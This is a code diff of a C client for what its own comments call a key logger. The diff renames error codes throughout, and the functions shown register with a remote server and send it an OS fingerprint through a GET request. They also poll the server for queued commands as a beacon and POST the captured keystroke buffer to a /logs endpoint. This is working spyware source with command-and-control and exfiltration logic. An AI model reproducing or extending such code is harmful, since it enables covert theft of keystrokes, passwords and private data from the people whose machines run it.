@@ -45,7 +45,7 @@ CLIENT_HANDLER* initClient() {
  * The server responds with the random encoding key which is stored in the
  * key logger
  */
-ERR_CODE registerClient(CLIENT_HANDLER *client, unsigned char* progContextKey) {
+RET_CODE registerClient(CLIENT_HANDLER *client, unsigned char* progContextKey) {
     time_t seconds = getCurrentTime();
 
     // retrieve and encode version and architecture
@@ -61,19 +61,19 @@ ERR_CODE registerClient(CLIENT_HANDLER *client, unsigned char* progContextKey) {
 
     // (ab)uses GET request to send os fingerprint
     HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "GET", registerStr, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
-    if (hRequest == NULL) { return ECODE_NULL; }
+    if (hRequest == NULL) { return R_NULL; }
 
     // send the register request
     if (!HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), NULL, 0)) {
         InternetCloseHandle(hRequest);
-        return ECODE_GET;
+        return R_GET;
     }
 
     // read the key from the response
     DWORD bytesRead;
     unsigned char key[2];
     if (!InternetReadFile(hRequest, key, 1, &bytesRead) && bytesRead != 0) {  
-        return ECODE_GET;
+        return R_GET;
     }
 
     // set the program context encoding key
@@ -81,7 +81,7 @@ ERR_CODE registerClient(CLIENT_HANDLER *client, unsigned char* progContextKey) {
 
     printf("\nSECRET: '%02X'\n", *progContextKey);
     InternetCloseHandle(hRequest);
-    return ECODE_SUCCESS;
+    return R_SUCCESS;
 }
 
 /**
@@ -125,49 +125,49 @@ static void retrieveArchInfo(char* arch) {
 /**
  * performs an HTTP GET request to the server to get all the this client queued commands
  */
-ERR_CODE pollCommandsAndBeacon(CLIENT_HANDLER *client) {
+RET_CODE pollCommandsAndBeacon(CLIENT_HANDLER *client) {
     time_t seconds = getCurrentTime();
     char commandRequ[MAX_MSG_LEN];
     snprintf(commandRequ, MAX_MSG_LEN, "/commands?cid=%s&time=%ld", client->id, seconds);
 
     // set up the request
     HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "GET", commandRequ, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
-    if (hRequest == NULL) { return ECODE_GET; }
+    if (hRequest == NULL) { return R_GET; }
 
     // send out the request
     if (!HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), NULL, 0)) {
         InternetCloseHandle(hRequest);
-        return ECODE_GET;
+        return R_GET;
     }
 
     // read the commands into the command buffer!
     DWORD bytesRead;
     if (!InternetReadFile(hRequest, client->cmdBuffer, MAX_BUFF_LEN - 1, &bytesRead)) {
-        return ECODE_GET;
+        return R_GET;
     }
     client->cmdBuffer[bytesRead] = '\0';
     InternetCloseHandle(hRequest);
 
-    if (bytesRead == 0) { return ECODE_EMPTY_BUFFER; }
-    return ECODE_SUCCESS;
+    if (bytesRead == 0) { return R_EMPTY_BUFFER; }
+    return R_SUCCESS;
 }
 
 /**
  * Write the client buffer to the servers logs. Afterwhich clear the buffer
  * Note: checking of buffer length is handled in program.c
  */
-ERR_CODE writeKeyLog(CLIENT_HANDLER* client, KEY_LOGGER* kLogger) {
+RET_CODE writeKeyLog(CLIENT_HANDLER* client, KEY_LOGGER* kLogger) {
     char logStr[MAX_MSG_LEN];
     snprintf(logStr, MAX_MSG_LEN, "/logs/%s", client->id);
 
     // send logs
     HINTERNET hRequest = HttpOpenRequestA(client->hConnect, "POST", logStr, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
-    if (hRequest == NULL) { return ECODE_POST; }
+    if (hRequest == NULL) { return R_POST; }
 
     HttpSendRequestA(hRequest, PLAIN_TEXT_H, strlen(PLAIN_TEXT_H), (LPVOID) kLogger->keyBuffer, kLogger->bufferPtr);
     InternetCloseHandle(hRequest);
 
-    return ECODE_SUCCESS;
+    return R_SUCCESS;
 }
 
 void clientCleanup(CLIENT_HANDLER *client) {
